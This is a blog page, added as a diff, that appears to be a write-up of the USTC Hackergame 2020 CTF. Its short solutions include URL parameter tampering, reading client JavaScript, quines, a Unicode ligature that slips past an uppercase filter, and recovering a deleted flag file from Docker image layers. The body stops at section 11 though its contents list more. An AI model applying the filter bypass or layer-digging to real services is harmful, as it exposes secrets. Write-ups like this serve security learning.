@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000">
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top">
+  
+  
+  <title>中科大2020年Hackergame WP | Dragon&#39;s Security Blogs</title>
+  <meta name="description" content="01 签到 点击提取按钮，发现地址栏出现.../?number=0 将0改为1便得flag  02 猫咪问答++百度一下即可；第一题较复杂，可枚举。 03 2048 F12发现提示： 1234&amp;lt;!--    changelog:   - 2020/10/31 getflxg @ static/js/html_actuator.js --&amp;gt;  打开 static/js/html_actu">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中科大2020年Hackergame WP">
+<meta property="og:url" content="https://dragonliu2018.github.io/2020/11/08/中科大2020年Hackergame-WP/index.html">
+<meta property="og:site_name" content="Dragon Liu">
+<meta property="og:description" content="01 签到 点击提取按钮，发现地址栏出现.../?number=0 将0改为1便得flag  02 猫咪问答++百度一下即可；第一题较复杂，可枚举。 03 2048 F12发现提示： 1234&amp;lt;!--    changelog:   - 2020/10/31 getflxg @ static/js/html_actuator.js --&amp;gt;  打开 static/js/html_actu">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://s2.loli.net/2022/04/18/1Oa98HiNyLKCZng.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/04/18/VTShoi5FKIalYtb.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/04/18/jVIEeAfXWsHyPmO.jpg">
+<meta property="og:updated_time" content="2022-07-04T07:54:39.168Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="中科大2020年Hackergame WP">
+<meta name="twitter:description" content="01 签到 点击提取按钮，发现地址栏出现.../?number=0 将0改为1便得flag  02 猫咪问答++百度一下即可；第一题较复杂，可枚举。 03 2048 F12发现提示： 1234&amp;lt;!--    changelog:   - 2020/10/31 getflxg @ static/js/html_actuator.js --&amp;gt;  打开 static/js/html_actu">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/18/1Oa98HiNyLKCZng.jpg">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://dragonliu2018.github.io/2020/11/08/中科大2020年Hackergame-WP/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Dragon Liu" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link href="//cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/dragonliu2018" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Dragon&#39;s Blogs</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Security</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/dragonliu2018" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</br>dragonliu2018@gmail.com</br>电脑端观看效果更佳！</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WP/">WP</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境与工具/">环境与工具</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/CTF/" style="font-size: 13px;">CTF</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/恶意代码/">恶意代码</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/03/10/【恶意家族进化分析】勒索病毒WannaCry家族/" class="title">【恶意家族进化分析】勒索病毒WannaCry家族</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-03-10T07:48:19.000Z" itemprop="datePublished">2022-03-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/恶意代码/">恶意代码</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/02/28/恶意样本收集/" class="title">恶意样本收集</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-02-28T14:49:09.000Z" itemprop="datePublished">2022-02-28</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/环境与工具/">环境与工具</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/01/30/Cuckoo-Sandbox-安装教程/" class="title">Cuckoo Sandbox 安装教程</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-01-30T13:56:31.000Z" itemprop="datePublished">2022-01-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WP/">WP</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/12/11/2021年NUAACTF校赛-WP/" class="title">2021年nuaa校赛 WP</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-12-11T13:28:09.000Z" itemprop="datePublished">2021-12-11</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/WP/">WP</a>
+              </p>
+              <p class="item-title">
+                <a href="/2021/10/30/中科大2021年Hackergame-WP/" class="title">中科大2021年Hackergame WP</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-10-30T13:27:28.000Z" itemprop="datePublished">2021-10-30</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+  <aside class="sidebar sidebar-toc collapse   in  " id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">文章目录</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#01-签到"><span class="toc-number">1.</span> <span class="toc-text">01 签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#02-猫咪问答"><span class="toc-number">2.</span> <span class="toc-text">02 猫咪问答++</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#03-2048"><span class="toc-number">3.</span> <span class="toc-text">03 2048</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#04-一闪而过的-Flag"><span class="toc-number">4.</span> <span class="toc-text">04 一闪而过的 Flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#05-从零开始的记账工具人"><span class="toc-number">5.</span> <span class="toc-text">05 从零开始的记账工具人</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#06-超简单的世界模拟器"><span class="toc-number">6.</span> <span class="toc-text">06 超简单的世界模拟器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#T1-蝴蝶效应"><span class="toc-number">6.1.</span> <span class="toc-text">T1 蝴蝶效应</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#07-自复读的复读机"><span class="toc-number">7.</span> <span class="toc-text">07 自复读的复读机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#T1-反向复读"><span class="toc-number">7.1.</span> <span class="toc-text">T1 反向复读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T2-哈希复读"><span class="toc-number">7.2.</span> <span class="toc-text">T2 哈希复读</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#08-233-同学的字符串工具"><span class="toc-number">8.</span> <span class="toc-text">08 233 同学的字符串工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#T1-字符串大写工具"><span class="toc-number">8.1.</span> <span class="toc-text">T1 字符串大写工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#09-233-同学的-Docker"><span class="toc-number">9.</span> <span class="toc-text">09 233 同学的 Docker</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-从零开始的-HTTP-链接"><span class="toc-number">10.</span> <span class="toc-text">10 从零开始的 HTTP 链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-来自一教的图片"><span class="toc-number">11.</span> <span class="toc-text">11 来自一教的图片</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-生活在博弈树上"><span class="toc-number">12.</span> <span class="toc-text">12 生活在博弈树上</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#T1-始终热爱大地"><span class="toc-number">12.1.</span> <span class="toc-text">T1 始终热爱大地</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T2-升上天空"><span class="toc-number">12.2.</span> <span class="toc-text">T2 升上天空</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-超精准的宇宙射线模拟器"><span class="toc-number">13.</span> <span class="toc-text">13 超精准的宇宙射线模拟器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-不经意传输"><span class="toc-number">14.</span> <span class="toc-text">14 不经意传输</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#T1-解密消息"><span class="toc-number">14.1.</span> <span class="toc-text">T1 解密消息</span></a></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-中科大2020年Hackergame-WP" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      中科大2020年Hackergame WP
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/11/08/中科大2020年Hackergame-WP/" class="article-date">
+	  <time datetime="2020-11-08T13:27:20.000Z" itemprop="datePublished">2020-11-08</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/WP/">WP</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/CTF/">CTF</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/11/08/中科大2020年Hackergame-WP/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 1.3k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 6(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="01-签到"><a href="#01-签到" class="headerlink" title="01 签到"></a>01 签到</h1><ul>
+<li>点击<code>提取</code>按钮，发现地址栏出现<code>.../?number=0</code></li>
+<li>将<code>0</code>改为<code>1</code>便得flag</li>
+</ul>
+<h1 id="02-猫咪问答"><a href="#02-猫咪问答" class="headerlink" title="02 猫咪问答++"></a>02 猫咪问答++</h1><p>百度一下即可；第一题较复杂，可枚举。</p>
+<h1 id="03-2048"><a href="#03-2048" class="headerlink" title="03 2048"></a>03 2048</h1><ul>
+<li><p>F12发现提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">   changelog:</span><br><span class="line">   - 2020/10/31 getflxg @ static/js/html_actuator.js</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打开 <code>static/js/html_actuator.js</code> 文件，找到和游戏胜利有关的逻辑：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url;</span><br><span class="line">  <span class="keyword">if</span> (won) &#123;</span><br><span class="line">    url = <span class="string">"/getflxg?my_favorite_fruit="</span> + (<span class="string">'b'</span>+<span class="string">'a'</span>+ +<span class="string">'a'</span>+<span class="string">'a'</span>).toLowerCase();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    url = <span class="string">"/getflxg?my_favorite_fruit="</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  request.open(<span class="string">'GET'</span>, url);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>打开 Chrome 浏览器的开发者工具，切换到 Console 标签页，执行一下 <code>(&#39;b&#39;+&#39;a&#39;+ +&#39;a&#39;+&#39;a&#39;).toLowerCase()</code>，得到正确的应该填入的值为 <code>banana</code>，访问 <code>/getflxg?my_favorite_fruit=banana</code>，则可以得到正确的 flag</p>
+</li>
+</ul>
+<h1 id="04-一闪而过的-Flag"><a href="#04-一闪而过的-Flag" class="headerlink" title="04 一闪而过的 Flag"></a>04 一闪而过的 Flag</h1><p>cmd运行文件即可。</p>
+<h1 id="05-从零开始的记账工具人"><a href="#05-从零开始的记账工具人" class="headerlink" title="05 从零开始的记账工具人"></a>05 从零开始的记账工具人</h1><ul>
+<li><p>首先使用 Excel将下载的文件转换为 <code>.csv</code> 格式，即逗号分隔的文本</p>
+</li>
+<li><p>然后在 Python 中安装 cn2an 这个中文数字转换的库：<code>python3 -m pip install cn2an</code></p>
+</li>
+<li><p>然后使用 Python 程序处理这个文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn2an</span><br><span class="line">lines = open(<span class="string">'bills.csv'</span>).readlines()[<span class="number">1</span>:]</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    a, b = line.strip().split(<span class="string">','</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'元'</span> <span class="keyword">in</span> a:</span><br><span class="line">        y, a = a.split(<span class="string">'元'</span>)</span><br><span class="line">        n += cn2an.cn2an(y, <span class="string">"smart"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'角'</span> <span class="keyword">in</span> a:</span><br><span class="line">        y, a = a.split(<span class="string">'角'</span>)</span><br><span class="line">        n += cn2an.cn2an(y, <span class="string">"smart"</span>) / <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'分'</span> <span class="keyword">in</span> a:</span><br><span class="line">        y, a = a.split(<span class="string">'分'</span>)</span><br><span class="line">        n += cn2an.cn2an(y, <span class="string">"smart"</span>) / <span class="number">100</span></span><br><span class="line">    s += n * int(b)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>四舍五入得flag</p>
+</li>
+</ul>
+<h1 id="06-超简单的世界模拟器"><a href="#06-超简单的世界模拟器" class="headerlink" title="06 超简单的世界模拟器"></a>06 超简单的世界模拟器</h1><h2 id="T1-蝴蝶效应"><a href="#T1-蝴蝶效应" class="headerlink" title="T1 蝴蝶效应"></a>T1 蝴蝶效应</h2><p>百度“生命游戏”了解一下，为了消除右上角的方块，只要放置一个水平移动的“太空船”即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000000</span><br><span class="line">001111000000000</span><br><span class="line">010001000000000</span><br><span class="line">000001000000000</span><br><span class="line">010010000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br></pre></td></tr></table></figure>
+<h1 id="07-自复读的复读机"><a href="#07-自复读的复读机" class="headerlink" title="07 自复读的复读机"></a>07 自复读的复读机</h1><h2 id="T1-反向复读"><a href="#T1-反向复读" class="headerlink" title="T1 反向复读"></a>T1 反向复读</h2><p>谷歌搜索“输出自己的程序”或者类似的词，可以查到这类程序叫做 Quine。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(s:=<span class="string">'print(("exec(s:=%r)"%s)[::-1],end="")'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="T2-哈希复读"><a href="#T2-哈希复读" class="headerlink" title="T2 哈希复读"></a>T2 哈希复读</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(s:=<span class="string">'print(__import__("hashlib").sha256(("exec(s:=%r)"%s).encode()).hexdigest(),end="")'</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="08-233-同学的字符串工具"><a href="#08-233-同学的字符串工具" class="headerlink" title="08 233 同学的字符串工具"></a>08 233 同学的字符串工具</h1><h2 id="T1-字符串大写工具"><a href="#T1-字符串大写工具" class="headerlink" title="T1 字符串大写工具"></a>T1 字符串大写工具</h2><ul>
+<li>以 “unicode uppercase collision” 为关键字搜索，链接：<a href="https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/" target="_blank" rel="noopener">https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/</a></li>
+<li>找到一个连字（ligature）<code>ﬂ (0xFB02)</code></li>
+<li>这个“字符”将在转换为大写时变成 <code>FL</code> 两个字符！因此，只需输入 <code>ﬂag</code> 即可得到 flag</li>
+</ul>
+<h1 id="09-233-同学的-Docker"><a href="#09-233-同学的-Docker" class="headerlink" title="09 233 同学的 Docker"></a>09 233 同学的 Docker</h1><ul>
+<li><p>参考博客：<a href="https://www.cnblogs.com/zejin2008/p/13460498.html" target="_blank" rel="noopener">https://www.cnblogs.com/zejin2008/p/13460498.html</a></p>
+</li>
+<li><p>拉取镜像 <code>docker pull 8b8d3c8324c7/stringtool</code></p>
+</li>
+<li><p>获取镜像历史构建信息，并标出层级：<code>sudo docker history 8b8d3c8324c7/stringtool</code><br><img src="https://s2.loli.net/2022/04/18/1Oa98HiNyLKCZng.jpg" width="1000" height="200" alt="图片名称" align="center" id="165"></p>
+<p>由此我们知道flag.txt是在倒数第二层被删除的，所以我们只需要找到该层的文件即可</p>
+</li>
+<li><p>用docker inspect 获取该层的diff路径：<code>sudo docker inspect 8b8d3c8324c7/stringtool</code></p>
+<p><img src="https://s2.loli.net/2022/04/18/VTShoi5FKIalYtb.jpg" width="1000" height="250" alt="图片名称" align="center" id="166"></p>
+<p>UpperDir 为最上层，其它从LowerDir一层层往下数。</p>
+</li>
+<li><p>选定LowerDir中的第一个，<code>sudo tree /var/lib/docker/overlay2/05c27a902f648e2f88d79a2498d6043bd2b8d5b01f15eb0ed4848dfff4ddad37/diff</code></p>
+<p><img src="https://s2.loli.net/2022/04/18/jVIEeAfXWsHyPmO.jpg" width="1000" height="150" alt="图片名称" align="center" id="167"></p>
+</li>
+<li><p>查看：<code>sudo cat /var/lib/docker/overlay2/05c27a902f648e2f88d79a2498d6043bd2b8d5b01f15eb0ed4848dfff4ddad37/diff/code/flag.txt</code></p>
+</li>
+</ul>
+<h1 id="10-从零开始的-HTTP-链接"><a href="#10-从零开始的-HTTP-链接" class="headerlink" title="10 从零开始的 HTTP 链接"></a>10 从零开始的 HTTP 链接</h1><ul>
+<li>整个腾讯云免费服务器，最好是ubuntu，centos配置环境老是出问题</li>
+<li><a href="https://github.com/vi/websocat/releases" target="_blank" rel="noopener">https://github.com/vi/websocat/releases</a> 下载 websocat_1.6.0_ssl1.0_amd64.deb</li>
+<li>gdebi websocat<em>…</em>.deb  （根据提示install一下gdebi）</li>
+<li>然后 websocat ws:// xxx.xxx.xxx.xxx:0/ shell</li>
+</ul>
+<h1 id="11-来自一教的图片"><a href="#11-来自一教的图片" class="headerlink" title="11 来自一教的图片"></a>11 来自一教的图片</h1><ul>
+<li><p>对图像二维傅里叶变换</p>
+</li>
+<li><p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取图像</span></span><br><span class="line">img = []</span><br><span class="line">img = cv.imread(<span class="string">'4f_system_middle.bmp'</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># if img:</span></span><br><span class="line"><span class="comment">#     print(666)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#傅里叶变换</span></span><br><span class="line">f = np.fft.fft2(img)</span><br><span class="line">fshift = np.fft.fftshift(f)</span><br><span class="line">res = np.log(np.abs(fshift))</span><br><span class="line"></span><br><span class="line"><span class="comment">#傅里叶逆变换</span></span><br><span class="line">ishift = np.fft.ifftshift(fshift)</span><br><span class="line">iimg = np.fft.ifft2(ishift)</span><br><span class="line">iimg = np.abs(iimg)</span><br><span class="line"></span><br><span class="line"><span class="comment">#展示结果</span></span><br><span class="line">plt.subplot(<span class="number">131</span>), plt.imshow(img, <span class="string">'gray'</span>), plt.title(<span class="string">'Original Image'</span>)</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line">plt.subplot(<span class="number">132</span>), plt.imshow(res, <span class="string">'gray'</span>), plt.title(<span class="string">'Fourier Image'</span>)</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line">plt.subplot(<span class="number">133</span>), plt.imshow(iimg, <span class="string">'gray'</span>), plt.title(<span class="string">'Inverse Fourier Image'</span>)</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将得到的照片调整即可得flag</p>
+</li>
+</ul>
